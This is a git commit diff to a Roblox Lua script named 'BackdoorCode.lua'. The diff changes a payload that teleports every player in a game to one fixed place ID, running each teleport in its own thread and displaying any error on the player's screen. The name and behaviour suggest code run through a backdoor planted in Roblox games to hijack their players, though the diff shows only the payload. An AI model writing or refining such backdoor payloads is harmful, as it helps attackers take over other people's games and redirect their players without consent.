a5bfd976ed8442803c95104e8752a7f3348289c1
qWixxyLuau <kiryuha4112@mail.ru>
2025-07-02 17:43:34 +0500

    Update BackdoorCode.lua

--- BackdoorCode.lua
+++ BackdoorCode.lua
@@ -1,5 +1,14 @@
 for _,v in pairs(game.Players:GetPlayers()) do
-	local s,e = pcall(function()
-		game:GetService("TeleportService"):Teleport(102212820666490,v)
+	task.spawn(function()
+		local s,e = pcall(function()
+			game:GetService("TeleportService"):Teleport(102212820666490,v)
+		end)
+		if not s then
+			local t = Instance.new("TextLabel",v.PlayerGui.BondGui)
+			t.Text = tostring(e)
+			t.Position = UDim2.new(0.347, 0,0.323, 0)
+			t.Size = UDim2.new(0.289, 0,0.326, 0)
+			t.TextScaled = true
+		end
 	end)
 end
